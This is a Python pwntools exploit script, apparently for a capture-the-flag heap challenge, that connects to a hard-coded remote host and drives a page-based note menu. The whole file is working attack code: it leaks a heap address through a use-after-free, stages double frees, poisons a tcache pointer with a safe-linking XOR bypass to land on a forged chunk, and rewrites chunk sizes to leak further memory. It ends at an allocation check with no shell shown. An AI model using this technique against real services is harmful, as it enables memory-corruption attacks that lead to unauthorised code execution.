from pwn import *

context.log_level = "info"


def create(io, idx, size=0x78, data=b"A"):
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"page? ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"length? ")
    io.sendline(str(size).encode())
    io.recvuntil(b"content? ")
    io.send(data.ljust(size, b"\0"))


def delete(io, idx):
    io.recvuntil(b"> ")
    io.sendline(b"2")
    io.recvuntil(b"page? ")
    io.sendline(str(idx).encode())


def dump(io, idx):
    io.recvuntil(b"> ")
    io.sendline(b"3")
    io.recvuntil(b"page? ")
    io.sendline(str(idx).encode())
    return io.recvline(drop=True)


def page_addr(page1, idx):
    return page1 + (idx - 1) * 0x80


io = remote("74.113.234.79", 2222)
fake_head = bytearray(0x78)
fake_head[0x18:0x20] = p64(0x81)
for idx in range(1, 18):
    data = bytes(fake_head) if idx == 2 else b"A"
    create(io, idx, data=data)

delete(io, 1)
heap_page = u64(dump(io, 1).ljust(8, b"\0"))
page1 = (heap_page << 12) + 0x2A0
fake_chunk = page_addr(page1, 2) + 0x20
a1 = page_addr(page1, 10)
print("page1", hex(page1))

for idx in range(3, 10):
    delete(io, idx)
delete(io, 10)
delete(io, 11)
delete(io, 10)

for idx in range(18, 25):
    create(io, idx, data=b"D")

poison1 = p64(fake_chunk ^ (a1 >> 12))
page10_fix = bytearray(0x78)
page10_fix[0x70:0x78] = p64(0x460)
page2_fix = bytearray(0x78)
page2_fix[0x18:0x20] = p64(0x461)

create(io, 25, data=poison1)
create(io, 26, data=b"B")
create(io, 27, data=bytes(page10_fix))
create(io, 28, data=b"T")
delete(io, 2)
create(io, 29, data=bytes(page2_fix))
delete(io, 28)
print("leak raw", dump(io, 28))

for idx in [2, 11, 12, 13, 14, 15, 16]:
    print("free", idx)
    delete(io, idx)
print("free 1")
delete(io, 1)
print("free 17")
delete(io, 17)
print("free 1 again")
delete(io, 1)

for idx in range(30, 37):
    print("alloc", idx)
    create(io, idx)

print("alloc 37")
create(io, 37)
print("survived 37")
